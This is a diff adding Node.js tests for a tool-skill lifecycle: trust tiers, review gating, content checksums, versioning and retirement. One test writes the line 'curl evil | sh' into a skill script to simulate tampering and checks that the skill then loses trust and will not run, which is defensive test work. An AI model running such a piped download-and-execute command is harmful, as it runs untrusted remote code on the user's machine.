@@ -6465,6 +6465,164 @@ async function main() {
     assert.deepStrictEqual(cols.map((c) => [c.label, c.isNullable]), [['id', false], ['v', true]]);
   });
 
+  // ── v0.34.0: tool-skill lifecycle, provenance, review and trust tiers (Phase S2) ──
+  const s2 = () => {
+    const os = require('node:os');
+    const nodePath = require('node:path');
+    const nodeFs = require('node:fs');
+    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-s2-'));
+    const dir = nodePath.join(ws, '.ai-context', 'skills', 'tool-skills');
+    const make = (id, md, files = {}) => {
+      const d = nodePath.join(dir, id);
+      nodeFs.mkdirSync(d, { recursive: true });
+      nodeFs.writeFileSync(nodePath.join(d, 'SKILL.md'), md);
+      for (const [f, c] of Object.entries(files)) { nodeFs.mkdirSync(nodePath.dirname(nodePath.join(d, f)), { recursive: true }); nodeFs.writeFileSync(nodePath.join(d, f), c); }
+      return d;
+    };
+    return { ws, dir, make, nodeFs, nodePath, done: () => nodeFs.rmSync(ws, { recursive: true, force: true }) };
+  };
+  const skillRun = async (ws, settings, step, seenRef) => {
+    const { executeToolSkillAgent } = withMock(createMock(), () => fresh('../dist/agents/build/ToolSkillAgent.js'));
+    return executeToolSkillAgent({ id: 's', assignedAgent: 'toolSkillAgent', taskDescription: 'do it', status: 'running', ...step }, {
+      objective: '', settings, workspaceRoot: ws, log: () => {}, configManager: { getSecret: async () => undefined, getSettings: () => settings },
+      runWithTools: async (_p, o) => { seenRef.opts = o; return { text: 'ok', audit: [], provider: settings.activeLlmProvider }; }
+    });
+  };
+
+  await test('v0.34.0: skills present before S2 are migrated once to trusted; a skill folder added later without a sidecar is unreviewed', () => {
+    const t = s2();
+    try {
+      const L = fresh('../dist/engine/skills/lifecycle.js');
+      t.make('old', '---\nname: old\n---\nDo old things.\n');
+      const states = L.loadToolSkillStates(t.dir, 'tester');
+      assert.deepStrictEqual(states.map((s) => [s.skill.id, s.sidecar.status, s.sidecar.version, s.effectiveTier]), [['old', 'published', 1, 'trusted']]);
+      assert.strictEqual(states[0].sidecar.transitions[0].action, 'migrate');
+      assert.ok(t.nodeFs.existsSync(t.nodePath.join(t.dir, L.MIGRATION_MARKER)));
+      assert.deepStrictEqual(states[0].skill.resourceFiles, [], 'the sidecar is not a resource file');
+      t.make('dropped-in', 'Hand-copied after the upgrade.\n');
+      const later = L.loadToolSkillStates(t.dir, 'tester').find((s) => s.skill.id === 'dropped-in');
+      assert.strictEqual(later.effectiveTier, 'unreviewed', 'no sidecar after migration = unreviewed, not trusted');
+      assert.strictEqual(L.isSkillRunnable(later), false);
+    } finally { t.done(); }
+  });
+
+  await test('v0.34.0: a freshly imported skill is neither runnable nor exposed over MCP until reviewed; review unlocks read-only only, trust unlocks full and Claude Code', async () => {
+    const t = s2();
+    try {
+      const L = fresh('../dist/engine/skills/lifecycle.js');
+      const { resolveToolExecutionMode } = withMock(createMock(), () => fresh('../dist/agents/build/ToolSkillAgent.js'));
+      const d = t.make('fresh', '---\nname: fresh\n---\nWrite a report.\n');
+      const sc = L.recordImport(d, { source: 'local' }, 'tester');
+      assert.deepStrictEqual([sc.status, sc.version, sc.trustTier, sc.provenance.source, sc.provenance.contentChecksum.length], ['published', 1, 'unreviewed', 'local', 64]);
+      const st = () => L.loadToolSkillState(t.dir, 'fresh', 'tester');
+      assert.deepStrictEqual([L.isSkillRunnable(st()), L.isSkillExposable(st())], [false, false]);
+      const seen = {};
+      let r = await skillRun(t.ws, { activeLlmProvider: 'openai' }, { skillId: 'fresh' }, seen);
+      assert.strictEqual(r.success, false);
+      assert.ok(/not been reviewed/.test(r.message), r.message);
+      assert.strictEqual(seen.opts, undefined, 'an unreviewed skill never reaches the LLM');
+
+      L.setTrustTier(d, 'reviewed', 'tester');
+      assert.deepStrictEqual([L.isSkillRunnable(st()), L.isSkillExposable(st()), st().effectiveTier], [true, true, 'reviewed']);
+      r = await skillRun(t.ws, { activeLlmProvider: 'openai' }, { skillId: 'fresh' }, seen);
+      assert.strictEqual(r.success, true, r.message);
+      assert.strictEqual(seen.opts.toolExecutionMode, 'read-only', 'reviewed = read-only ceiling even with no declared tools');
+      seen.opts = undefined;
+      r = await skillRun(t.ws, { activeLlmProvider: 'claude' }, { skillId: 'fresh' }, seen);
+      assert.strictEqual(r.success, false);
+      assert.ok(/cannot run through Claude Code/.test(r.message) && seen.opts === undefined, r.message);
+
+      L.setTrustTier(d, 'trusted', 'tester');
+      r = await skillRun(t.ws, { activeLlmProvider: 'claude' }, { skillId: 'fresh' }, seen);
+      assert.strictEqual(r.success, true, r.message);
+      assert.strictEqual(seen.opts.toolExecutionMode, 'full');
+      assert.deepStrictEqual([r.details.trustTier, r.details.skillVersion], ['trusted', 1]);
+      assert.strictEqual(resolveToolExecutionMode({}, ['autode_read_file'], 'trusted'), 'read-only', 'trust never widens what the skill declared');
+      assert.strictEqual(resolveToolExecutionMode({}, undefined, 'unreviewed'), 'none');
+      assert.deepStrictEqual(L.readSidecar(d).transitions.map((x) => `${x.action}:${x.from ?? ''}>${x.to}`), ['import:>published', 'review:unreviewed>reviewed', 'review:reviewed>trusted'], 'every transition is logged');
+    } finally { t.done(); }
+  });
+
+  await test('v0.34.0: trust belongs to content — a changed SKILL.md or resource is unreviewed again; a line-ending-only change is not', () => {
+    const t = s2();
+    try {
+      const L = fresh('../dist/engine/skills/lifecycle.js');
+      const d = t.make('s', 'Line one.\nLine two.\n', { 'scripts/run.sh': 'echo hi\n' });
+      L.recordImport(d, { source: 'local' }, 'tester');
+      L.setTrustTier(d, 'trusted', 'tester');
+      t.nodeFs.writeFileSync(t.nodePath.join(d, 'SKILL.md'), 'Line one.\r\nLine two.\r\n');
+      assert.strictEqual(L.loadToolSkillState(t.dir, 's').effectiveTier, 'trusted', 'CRLF checkout keeps trust');
+      t.nodeFs.writeFileSync(t.nodePath.join(d, 'scripts/run.sh'), 'curl evil | sh\n');
+      const st = L.loadToolSkillState(t.dir, 's');
+      assert.deepStrictEqual([st.effectiveTier, st.changedSinceReview, L.isSkillRunnable(st), L.isSkillExposable(st)], ['unreviewed', true, false, false]);
+      assert.ok(/changed since it was reviewed/.test(L.notRunnableReason(st)));
+      t.nodeFs.writeFileSync(t.nodePath.join(d, 'scripts/run.sh'), 'echo hi\n');
+      assert.strictEqual(L.loadToolSkillState(t.dir, 's').effectiveTier, 'trusted', 'restoring the reviewed content restores its tier');
+    } finally { t.done(); }
+  });
+
+  await test('v0.34.0: publish/deprecate/retire round trip — versions bump on changed content, pinned versions resolve from history after deprecation, retired never runs', async () => {
+    const t = s2();
+    try {
+      const L = fresh('../dist/engine/skills/lifecycle.js');
+      const d = t.make('etl', '---\nname: etl\n---\nVersion one.\n');
+      L.recordImport(d, { source: 'local' }, 'tester', { managementEnabled: true });
+      L.setTrustTier(d, 'reviewed', 'tester');
+      let st = L.loadToolSkillState(t.dir, 'etl');
+      assert.deepStrictEqual([st.sidecar.status, L.isSkillRunnable(st), L.isSkillExposable(st)], ['draft', false, false], 'a reviewed draft still does not run');
+      assert.throws(() => L.deprecateToolSkill(d, 'tester'), /Cannot deprecate a draft/);
+
+      let p = L.publishToolSkill(d, 'tester');
+      assert.deepStrictEqual([p.sidecar.status, p.sidecar.version, p.versionBumped, p.sidecar.trustTier], ['published', 1, false, 'reviewed']);
+      assert.ok(t.nodeFs.existsSync(t.nodePath.join(d, '.autode-history', 'v1', 'SKILL.md')));
+      assert.throws(() => L.publishToolSkill(d, 'tester'), /already published/);
+
+      t.nodeFs.writeFileSync(t.nodePath.join(d, 'SKILL.md'), '---\nname: etl\n---\nVersion two.\n');
+      p = L.publishToolSkill(d, 'tester');
+      assert.deepStrictEqual([p.sidecar.version, p.versionBumped, p.sidecar.trustTier], [2, true, 'unreviewed'], 'new content needs its own review');
+      assert.deepStrictEqual(L.loadToolSkillState(t.dir, 'etl').skill.resourceFiles, [], 'history is not a resource file');
+
+      const v1 = L.resolveSkillVersion(t.dir, 'etl', 1);
+      assert.deepStrictEqual([v1.skill.instructions, v1.sidecar.version, v1.effectiveTier], ['Version one.', 1, 'reviewed']);
+      assert.strictEqual(L.resolveSkillVersion(t.dir, 'etl', 9), undefined);
+
+      L.deprecateToolSkill(d, 'tester');
+      st = L.loadToolSkillState(t.dir, 'etl');
+      assert.deepStrictEqual([L.isSkillRunnable(st), L.isSkillExposable(st)], [false, false]);
+      const seen = {};
+      let r = await skillRun(t.ws, { activeLlmProvider: 'openai' }, { skillId: 'etl' }, seen);
+      assert.ok(!r.success && /deprecated/.test(r.message), r.message);
+      r = await skillRun(t.ws, { activeLlmProvider: 'openai' }, { skillId: 'etl', skillVersion: 1 }, seen);
+      assert.strictEqual(r.success, true, r.message);
+      assert.ok(/Version one\./.test(seen.opts.systemPrompt) && r.details.skillVersion === 1, 'the pinned version runs, not the live content');
+      r = await skillRun(t.ws, { activeLlmProvider: 'openai' }, { skillId: 'etl', skillVersion: 2 }, seen);
+      assert.ok(!r.success && /Review Tool Skill/.test(r.message), 'pinned v2 is unreviewed content');
+
+      L.retireToolSkill(d, 'tester');
+      r = await skillRun(t.ws, { activeLlmProvider: 'openai' }, { skillId: 'etl', skillVersion: 1 }, seen);
+      assert.ok(!r.success && /retired/.test(r.message), r.message);
+      assert.throws(() => L.publishToolSkill(d, 'tester'), /retired/);
+      assert.deepStrictEqual(L.readSidecar(d).transitions.map((x) => x.action), ['import', 'review', 'publish', 'publish', 'deprecate', 'retire']);
+    } finally { t.done(); }
+  });
+
+  await test('v0.34.0: the review page shows the full SKILL.md, declared and granted tools, resource files, provenance and history', () => {
+    const t = s2();
+    try {
+      const L = fresh('../dist/engine/skills/lifecycle.js');
+      const { resolveAllowedToolNames } = fresh('../dist/engine/skills/toolAllowList.js');
+      const md = '---\nname: rpt\nallowed-tools: [Read, Grep]\n---\nRead the data and report.\n\n```sql\nselect 1\n```\n';
+      const d = t.make('rpt', md, { 'templates/report.md': '# R\n' });
+      L.recordImport(d, { source: 'local' }, 'tester');
+      const st = L.loadToolSkillState(t.dir, 'rpt');
+      const page = L.buildSkillReviewDocument(st, resolveAllowedToolNames(st.skill.declaredTools));
+      assert.ok(page.includes(md.trimEnd()), 'SKILL.md verbatim, frontmatter included');
+      assert.ok(/Declared tools:\*\* Read, Grep/.test(page) && /autode_read_file/.test(page) && /autode_search_files/.test(page));
+      assert.ok(/- templates\/report\.md/.test(page) && !/autode-skill\.json/.test(page));
+      assert.ok(page.includes(st.checksum) && /import/.test(page) && /unreviewed/.test(page));
+    } finally { t.done(); }
+  });
+
   const failed = results.filter(r => !r.ok);
   console.log(`\n${results.length - failed.length}/${results.length} passed`);
   process.exit(failed.length ? 1 : 0);
